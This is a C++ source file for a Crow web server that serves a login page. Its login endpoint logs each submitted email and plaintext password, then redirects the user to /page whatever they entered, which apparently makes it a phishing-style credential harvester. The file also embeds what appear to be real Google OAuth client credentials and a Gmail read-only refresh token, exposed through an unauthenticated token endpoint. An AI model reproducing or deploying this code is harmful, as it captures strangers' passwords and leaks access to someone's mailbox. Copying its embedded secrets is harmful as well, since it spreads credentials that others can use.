#include <cpr/cpr.h>
#include <phc/app.h>
#include <phc/mustache.h>
#include <sstream>
#include <string>
#include <unordered_map>

std::unordered_map<std::string, std::string> create_cache(const char *path);

std::string url_decode(const std::string &str) {
  std::string decoded;
  char hex_buffer[3] = {0};

  for (size_t i = 0; i < str.length(); i++) {
    if (str[i] == '%' && i + 2 < str.length()) {
      hex_buffer[0] = str[i + 1];
      hex_buffer[1] = str[i + 2];
      try {
        decoded += static_cast<char>(std::stoi(hex_buffer, nullptr, 16));
        i += 2; // Skip next two characters
      } catch (const std::exception &) {
        decoded += '%'; // Keep '%' if decoding fails
      }
    } else if (str[i] == '+') {
      decoded += ' ';
    } else {
      decoded += str[i];
    }
  }
  return decoded;
}

std::unordered_map<std::string, std::string> parse_form_data(const std::string &body) {
  std::unordered_map<std::string, std::string> form_data;
  std::istringstream ss(body);
  std::string pair;

  while (std::getline(ss, pair, '&')) {
    size_t pos = pair.find('=');
    if (pos != std::string::npos) {
      std::string key = url_decode(pair.substr(0, pos));
      std::string value = url_decode(pair.substr(pos + 1));
      form_data[key] = value;
    }
  }
  return form_data;
}

crow::response refresh_token() {
  const std::string clientId =
      "896874297417-eprj6ua5k0dghqa66pvacdm36mqjvdcd.apps.googleusercontent.com";
  const std::string clientSecret = "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";
  const std::string refreshToken =
      "1//"
      "0gcOydbf3CRi7CgYIARAAGBASNwF-"
      "L9Irgh5fwbJsZIf4rkZCb0AXSlYt7dWaJ7MZrBxLwHHYT92YyF7rA5ACOLLAINoEO5cDEG4";
  const std::string scope = "https://www.googleapis.com/auth/gmail.readonly";

  std::string body = "grant_type=refresh_token"
                     "&client_id=" +
                     std::string(clientId) + "&client_secret=" + std::string(clientSecret) +
                     "&refresh_token=" + std::string(refreshToken);

  cpr::Response response = cpr::Post(
      cpr::Url {"https://oauth2.googleapis.com/token"},
      cpr::Header {{"Content-Type", "application/x-www-form-urlencoded"}}, cpr::Body {body}
  );

  CROW_LOG_INFO << "Response status: " << response.status_code;
  CROW_LOG_INFO << "Response body: " << response.text;

  return crow::response(response.status_code, response.text);
}

int main(int argc, char *argv[]) {
  const int port = argc > 1 ? std::atoi(argv[1]) : 8000;
  crow::SimpleApp app;

  crow::mustache::set_global_base("web");
  for (const auto &[file, data] : create_cache("web")) {
    std::cout << "File: " << file << std::endl;
    std::cout << "Data: " << data << std::endl << std::endl;
  }

  CROW_ROUTE(app, "/")([]() { return crow::mustache::load_text_unsafe("login.html"); });

  CROW_ROUTE(app, "/api/login")
      .methods(crow::HTTPMethod::POST)([](const crow::request &req) {
        if (req.get_header_value("Content-Type") != "application/x-www-form-urlencoded") {
          crow::response response(crow::status::SEE_OTHER);
          response.set_header("Location", "/invalid");
          return response;
        }

        CROW_LOG_INFO << "Body: " << req.body;
        auto data = parse_form_data(req.body);

        if (data.contains("email") && data.contains("password")) {
          CROW_LOG_INFO << "Email: " << data["email"];
          CROW_LOG_INFO << "Pass: " << data["password"];
        }

        crow::response response(crow::status::SEE_OTHER);
        response.set_header("Location", "/page");
        return response;
      });

  CROW_ROUTE(app, "/invalid")([]() {
    return crow::mustache::load_text_unsafe("invalid.html");
  });
  CROW_ROUTE(app, "/page")([]() { return crow::mustache::load_text_unsafe("page.html"); });

  CROW_ROUTE(app, "/api/token")([]() { return refresh_token(); });

  app.port(port).multithreaded().run();
  return 0;
}

std::unordered_map<std::string, std::string> create_cache(const char *path) {
  namespace fs = std::filesystem;
  std::unordered_map<std::string, std::string> map;

  try {
    for (const auto &file : fs::recursive_directory_iterator(path)) {
      if (file.is_regular_file()) {
        std::ifstream file_stream(file.path(), std::ios::binary);
        if (!file_stream) {
          CROW_LOG_ERROR << "Failed to open file: " << file.path();
          continue;
        }

        std::string contents(
            (std::istreambuf_iterator<char>(file_stream)), std::istreambuf_iterator<char>()
        );
        map[file.path().string()] = std::move(contents);
      }
    }
  } catch (const std::exception &e) {
    CROW_LOG_ERROR << "Error reading directory: " << e.what();
  }

  return map;
}
